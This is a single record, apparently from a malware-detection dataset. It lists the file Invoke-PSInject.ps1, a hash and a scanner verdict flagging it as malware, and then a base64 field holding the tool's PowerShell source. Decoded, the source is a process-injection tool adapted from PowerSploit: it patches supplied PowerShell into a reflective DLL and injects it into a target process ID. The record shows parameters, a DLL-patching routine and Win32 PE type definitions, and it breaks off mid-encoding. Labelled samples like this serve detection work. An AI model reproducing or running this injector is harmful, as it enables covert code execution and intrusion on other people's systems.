Invoke-PSInject.ps1,fa26f41e1f4895c82cb5010f199c0494,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gSW52b2tlLVBTSW5qZWN0CnsKIDwjCi5TWU5PUFNJUwpUYXNrZXMgYSBQb3dlclNoZWxsIHNjcmlwdCBibG9jayAoYmFzZTY0LWVuY29kZWQpLCBwYXRjaGVzCnRoZSBkZWNvZGVkIGxvZ2ljIGludG8gdGhlIGFyY2hpdGVjdHVyZSBhcHByb3ByaWF0ZSBSZWZsZWN0aXZlUGljawouZGxsLCBhbmQgaW5qZWN0cyB0aGUgcmVzdWx0IGludG8gYSBzcGVjaWZpZWQgUHJvY2Vzc0lELgoKQWRhcHRlZCBmcm9tIFBvd2VyU3Bsb2l0J3MgSW52b2tlLVJlZmxlY2l2ZURMTEluamVjdGlvbiBjb2RlYmFzZQoKLlBBUkFNRVRFUiBQcm9jSWQKUHJvY2VzcyB0byBpbmplY3QgUmVmbGVjdGl2ZVBpY2sgaW50bwoKLlBBUkFNRVRFUiBQb3NoQ29kZQpCYXNlNjQtZW5jb2RlZCBQb3dlclNoZWxsIGNvZGUgdG8gaW5qZWN0LgojPgoKCltDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lPSJXZWJGaWxlIildClBhcmFtKAogICAgCiAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSldCiAgICBbU3RyaW5nW11dCiAgICAkQ29tcHV0ZXJOYW1lLAogICAgCiAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMildCiAgICBbVmFsaWRhdGVTZXQoICdXU3RyaW5nJywgJ1N0cmluZycsICdWb2lkJywgJ090aGVyJyApXQogICAgW1N0cmluZ10KICAgICRGdW5jUmV0dXJuVHlwZSA9ICdPdGhlcicsCiAgICAKICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzKV0KICAgIFtTdHJpbmddCiAgICAkRXhlQXJncywKICAgIAogICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDQpXQogICAgW0ludDMyXQogICAgJFByb2NJZCwKICAgIAogICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDUpXQogICAgW1N0cmluZ10KICAgICRQcm9jTmFtZSwKICAgIAogICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDYsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgIFtWYWxpZGF0ZUxlbmd0aCgxLDEyMDApXQogICAgW1N0cmluZ10KICAgICRQb3NoQ29kZSwKCiAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNyldCiAgICBbU3dpdGNoXQogICAgJEZvcmNlQVNMUgopCgogICAgU2V0LVN0cmljdE1vZGUgLVZlcnNpb24gMgoKICAgICMgZGVjb2RlIHRoZSBiYXNlNjQgc2NyaXB0IGJsb2NrCiAgICAkUG9zaENvZGUgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVTklDT0RFLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRQb3NoQ29kZSkpOwoKICAgIGZ1bmN0aW9uIEludm9rZS1QYXRjaERsbCB7CiAgICAgICAgPCMKICAgICAgICAuU1lOT1BTSVMKICAgICAgICBQYXRjaGVzIGEgc3RyaW5nIGluIGEgYmluYXJ5IGJ5dGUgYXJyYXkuCgogICAgICAgIC5QQVJBTUVURVIgRGxsQnl0ZXMKICAgICAgICBCaW5hcnkgYmxvZyB0byBwYXRjaC4KCiAgICAgICAgLlBBUkFNRVRFUiBGaW5kU3RyaW5nCiAgICAgICAgU3RyaW5nIHRvIHNlYXJjaCBmb3IgdG8gcmVwbGFjZS4KCiAgICAgICAgLlBBUkFNRVRFUiBSZXBsYWNlU3RyaW5nCiAgICAgICAgU3RyaW5nIHRvIHJlcGxhY2UgRmluZFN0cmluZyB3aXRoCiAgICAgICAgIz4KCiAgICAgICAgW0NtZGxldEJpbmRpbmcoKV0KICAgICAgICBwYXJhbSgKICAgICAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgICAgIFtCeXRlW11dCiAgICAgICAgICAgICREbGxCeXRlcywKCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgICAgICBbc3RyaW5nXQogICAgICAgICAgICAkRmluZFN0cmluZywKCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgICAgICBbc3RyaW5nXQogICAgICAgICAgICAkUmVwbGFjZVN0cmluZwogICAgICAgICkKCiAgICAgICAgJEZpbmRTdHJpbmdCeXRlcyA9IChbc3lzdGVtLlRleHQuRW5jb2RpbmddOjpVTklDT0RFKS5HZXRCeXRlcygkRmluZFN0cmluZykKICAgICAgICAkUmVwbGFjZVN0cmluZ0J5dGVzID0gKFtzeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVOSUNPREUpLkdldEJ5dGVzKCRSZXBsYWNlU3RyaW5nKQoKICAgICAgICAkaW5kZXggPSAwCiAgICAgICAgJHMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVTklDT0RFLkdldFN0cmluZygkRGxsQnl0ZXMpCiAgICAgICAgJGluZGV4ID0gJHMuSW5kZXhPZigkRmluZFN0cmluZykgKiAyCiAgICAgICAgV3JpdGUtVmVyYm9zZSAicGF0Y2ggaW5kZXg6ICRpbmRleCIKCiAgICAgICAgaWYoJGluZGV4IC1lcSAwKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3coIkNvdWxkIG5vdCBmaW5kIHN0cmluZyAkRmluZFN0cmluZyAhIikKICAgICAgICB9CgogICAgICAgIGZvciAoJGk9MDsgJGkgLWx0ICRSZXBsYWNlU3RyaW5nQnl0ZXMuTGVuZ3RoOyAkaSsrKQogICAgICAgIHsKICAgICAgICAgICAgJERsbEJ5dGVzWyRpbmRleCskaV09JFJlcGxhY2VTdHJpbmdCeXRlc1skaV0KICAgICAgICB9CgogICAgICAgICMgbnVsbCB0ZXJtaW5hdGUgdGhlIHJlcGxhY2VkIHN0cmluZwogICAgICAgICREbGxCeXRlc1skaW5kZXgrJFJlcGxhY2VTdHJpbmdCeXRlcy5MZW5ndGhdID0gW2J5dGVdMHgwMAogICAgICAgICREbGxCeXRlc1skaW5kZXgrJFJlcGxhY2VTdHJpbmdCeXRlcy5MZW5ndGgrMV0gPSBbYnl0ZV0weDAwCgogICAgICAgICRyZXBsYWNlc3RhcnQgPSAkaW5kZXgKICAgICAgICAkcmVwbGFjZWVuZCA9ICRpbmRleCArICRSZXBsYWNlU3RyaW5nQnl0ZXMuTGVuZ3RoCiAgICAgICAgd3JpdGUtdmVyYm9zZSAicmVwbGFjZXN0YXJ0OiAkcmVwbGFjZXN0YXJ0IgogICAgICAgIHdyaXRlLXZlcmJvc2UgInJlcGxhY2VlbmQ6ICRyZXBsYWNlZW5kIgoKICAgICAgICAkTmV3Q29kZT1bU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldFN0cmluZygkUmF3Qnl0ZXNbJHJlcGxhY2VzdGFydC4uJHJlcGxhY2VlbmRdKQogICAgICAgIHdyaXRlLXZlcmJvc2UgIlJlcGxhY2VkIHBhdHRlcm4gd2l0aDogJE5ld0NvZGUiCiAgICAgICAgCiAgICAgICAgcmV0dXJuICREbGxCeXRlcwogICAgfQoKCiRSZW1vdGVTY3JpcHRCbG9jayA9IHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFBFQnl0ZXM2NCwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRQRUJ5dGVzMzIsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRGdW5jUmV0dXJuVHlwZSwKICAgICAgICAgICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0ludDMyXQogICAgICAgICRQcm9jSWQsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRQcm9jTmFtZSwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDQsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbQm9vbF0KICAgICAgICAkRm9yY2VBU0xSLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA1LCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkUG9zaENvZGUKICAgICkKICAgIAogICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKICAgICMjIyMjIyMjIyMgIFdpbjMyIFN0dWZmICAjIyMjIyMjIyMjCiAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwogICAgRnVuY3Rpb24gR2V0LVdpbjMyVHlwZXMKICAgIHsKICAgICAgICAkV2luMzJUeXBlcyA9IE5ldy1PYmplY3QgU3lzdGVtLk9iamVjdAoKICAgICAgICAjRGVmaW5lIGFsbCB0aGUgc3RydWN0dXJlcy9lbnVtcyB0aGF0IHdpbGwgYmUgdXNlZAogICAgICAgICMgICBUaGlzIGFydGljbGUgc2hvd3MgeW91IGhvdyB0byBkbyB0aGlzIHdpdGggcmVmbGVjdGlvbjogaHR0cDovL3d3dy5leHBsb2l0LW1vbmRheS5jb20vMjAxMi8wNy9zdHJ1Y3RzLWFuZC1lbnVtcy11c2luZy1yZWZsZWN0aW9uLmh0bWwKICAgICAgICAkRG9tYWluID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4KICAgICAgICAkRHluYW1pY0Fzc2VtYmx5ID0gTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoJ0R5bmFtaWNBc3NlbWJseScpCiAgICAgICAgJEFzc2VtYmx5QnVpbGRlciA9ICREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KCREeW5hbWljQXNzZW1ibHksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikKICAgICAgICAkTW9kdWxlQnVpbGRlciA9ICRBc3NlbWJseUJ1aWxkZXIuRGVmaW5lRHluYW1pY01vZHVsZSgnRHluYW1pY01vZHVsZScsICRmYWxzZSkKICAgICAgICAkQ29uc3RydWN0b3JJbmZvID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsQXNBdHRyaWJ1dGVdLkdldENvbnN0cnVjdG9ycygpWzBdCgoKICAgICAgICAjIyMjIyMjIyMjIyMgICAgRU5VTSAgICAjIyMjIyMjIyMjIyMKICAgICAgICAjRW51bSBNYWNoaW5lVHlwZQogICAgICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZUVudW0oJ01hY2hpbmVUeXBlJywgJ1B1YmxpYycsIFtVSW50MTZdKQogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdOYXRpdmUnLCBbVUludDE2XSAwKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0kzODYnLCBbVUludDE2XSAweDAxNGMpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSXRhbml1bScsIFtVSW50MTZdIDB4MDIwMCkgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCd4NjQnLCBbVUludDE2XSAweDg2NjQpIHwgT3V0LU51bGwKICAgICAgICAkTWFjaGluZVR5cGUgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCiAgICAgICAgJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBNYWNoaW5lVHlwZSAtVmFsdWUgJE1hY2hpbmVUeXBlCgogICAgICAgICNFbnVtIE1hZ2ljVHlwZQogICAgICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZUVudW0oJ01hZ2ljVHlwZScsICdQdWJsaWMnLCBbVUludDE2XSkKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfTlRfT1BUSU9OQUxfSERSMzJfTUFHSUMnLCBbVUludDE2XSAweDEwYikgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9OVF9PUFRJT05BTF9IRFI2NF9NQUdJQycsIFtVSW50MTZdIDB4MjBiKSB8IE91dC1OdWxsCiAgICAgICAgJE1hZ2ljVHlwZSA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKICAgICAgICAkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE1hZ2ljVHlwZSAtVmFsdWUgJE1hZ2ljVHlwZQoKICAgICAgICAjRW51bSBTdWJTeXN0ZW1UeXBlCiAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lRW51bSgnU3ViU3lzdGVtVHlwZScsICdQdWJsaWMnLCBbVUludDE2XSkKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX1VOS05PV04nLCBbVUludDE2XSAwKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9OQVRJVkUnLCBbVUludDE2XSAxKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9XSU5ET1dTX0dVSScsIFtVSW50MTZdIDIpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX1dJTkRPV1NfQ1VJJywgW1VJbnQxNl0gMykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fUE9TSVhfQ1VJJywgW1VJbnQxNl0gNykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fV0lORE9XU19DRV9HVUknLCBbVUludDE2XSA5KSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9FRklfQVBQTElDQVRJT04nLCBbVUludDE2XSAxMCkgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fRUZJX0JPT1RfU0VSVklDRV9EUklWRVInLCBbVUludDE2XSAxMSkgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fRUZJX1JVTlRJTUVfRFJJVkVSJywgW1VJbnQxNl0gMTIpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX0VGSV9ST00nLCBbVUludDE2XSAxMykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fWEJPWCcsIFtVSW50MTZdIDE0KSB8IE91dC1OdWxsCiAgICAgICAgJFN1YlN5c3RlbVR5cGUgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCiAgICAgICAgJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBTdWJTeXN0ZW1UeXBlIC1WYWx1ZSAkU3ViU3lzdGVtVHlwZQoKICAgICAgICAjRW51bSBEbGxDaGFyYWN0ZXJpc3RpY3NUeXBlCiAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lRW51bSgnRGxsQ2hhcmFjdGVyaXN0aWNzVHlwZScsICdQdWJsaWMnLCBbVUludDE2XSkKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnUkVTXzAnLCBbVUludDE2XSAweDAwMDEpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnUkVTXzEnLCBbVUludDE2XSAweDAwMDIpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnUkVTXzInLCBbVUludDE2XSAweDAwMDQpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnUkVTXzMnLCBbVUludDE2XSAweDAwMDgpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfRExMX0NIQVJBQ1RFUklTVElDU19EWU5BTUlDX0JBU0UnLCBbVUludDE2XSAweDAwNDApIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfRExMX0NIQVJBQ1RFUklTVElDU19GT1JDRV9JTlRFR1JJVFknLCBbVUludDE2XSAweDAwODApIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfRExMX0NIQVJBQ1RFUklTVElDU19OWF9DT01QQVQnLCBbVUludDE2XSAweDAxMDApIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX05PX0lTT0xBVElPTicsIFtVSW50MTZdIDB4MDIwMCkgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9ETExDSEFSQUNURVJJU1RJQ1NfTk9fU0VIJywgW1VJbnQxNl0gMHgwNDAwKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX0RMTENIQVJBQ1RFUklTVElDU19OT19CSU5EJywgW1VJbnQxNl0gMHgwODAwKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1JFU180JywgW1VJbnQxNl0gMHgxMDAwKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX0RMTENIQVJBQ1RFUklTVElDU19XRE1fRFJJVkVSJywgW1VJbnQxNl0gMHgyMDAwKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX0RMTENIQVJBQ1RFUklTVElDU19URVJNSU5BTF9TRVJWRVJfQVdBUkUnLCBbVUludDE2XSAweDgwMDApIHwgT3V0LU51bGwKICAgICAgICAkRGxsQ2hhcmFjdGVyaXN0aWNzVHlwZSA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKICAgICAgICAkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIERsbENoYXJhY3RlcmlzdGljc1R5cGUgLVZhbHVlICREbGxDaGFyYWN0ZXJpc3RpY3NUeXBlCgogICAgICAgICMjIyMjIyMjIyMjICAgIFNUUlVDVCAgICAjIyMjIyMjIyMjIwogICAgICAgICNTdHJ1Y3QgSU1BR0VfREFUQV9ESVJFQ1RPUlkKICAgICAgICAkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIEV4cGxpY2l0TGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCcKICAgICAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdJTUFHRV9EQVRBX0RJUkVDVE9SWScsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDgpCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVmlydHVhbEFkZHJlc3MnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemUnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNCkgfCBPdXQtTnVsbAogICAgICAgICRJTUFHRV9EQVRBX0RJUkVDVE9SWSA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKICAgICAgICAkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX0RBVEFfRElSRUNUT1JZIC1WYWx1ZSAkSU1BR0VfREFUQV9ESVJFQ1RPUlkKCiAgICAgICAgI1N0cnVjdCBJTUFHRV9GSUxFX0hFQURFUgogICAgICAgICRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCiAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnSU1BR0VfRklMRV9IRUFERVInLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCAyMCkKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01hY2hpbmUnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ051bWJlck9mU2VjdGlvbnMnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1RpbWVEYXRlU3RhbXAnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1BvaW50ZXJUb1N5bWJvbFRhYmxlJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdOdW1iZXJPZlN5bWJvbHMnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZk9wdGlvbmFsSGVhZGVyJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdDaGFyYWN0ZXJpc3RpY3MnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkSU1BR0VfRklMRV9IRUFERVIgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCiAgICAgICAgJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9GSUxFX0hFQURFUiAtVmFsdWUgJElNQUdFX0ZJTEVfSEVBREVSCgogICAgICAgICNTdHJ1Y3QgSU1BR0VfT1BUSU9OQUxfSEVBREVSNjQKICAgICAgICAkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIEV4cGxpY2l0TGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCcKICAgICAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdJTUFHRV9PUFRJT05BTF9IRUFERVI2NCcsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDI0MCkKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNYWdpYycsICRNYWdpY1R5cGUsICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDApIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNYWpvckxpbmtlclZlcnNpb24nLCBbQnl0ZV0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNaW5vckxpbmtlclZlcnNpb24nLCBbQnl0ZV0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDMpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZDb2RlJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZJbml0aWFsaXplZERhdGEnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoOCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZlVuaW5pdGlhbGl6ZWREYXRhJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDEyKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQWRkcmVzc09mRW50cnlQb2ludCcsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgxNikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0Jhc2VPZkNvZGUnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMjApIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdJbWFnZUJhc2UnLCBbVUludDY0XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMjQpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTZWN0aW9uQWxpZ25tZW50JywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDMyKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRmlsZUFsaWdubWVudCcsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgzNikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01ham9yT3BlcmF0aW5nU3lzdGVtVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg0MCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01pbm9yT3BlcmF0aW5nU3lzdGVtVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg0MikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01ham9ySW1hZ2VWZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQ0KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWlub3JJbWFnZVZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNDYpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNYWpvclN1YnN5c3RlbVZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNDgpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNaW5vclN1YnN5c3RlbVZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpKS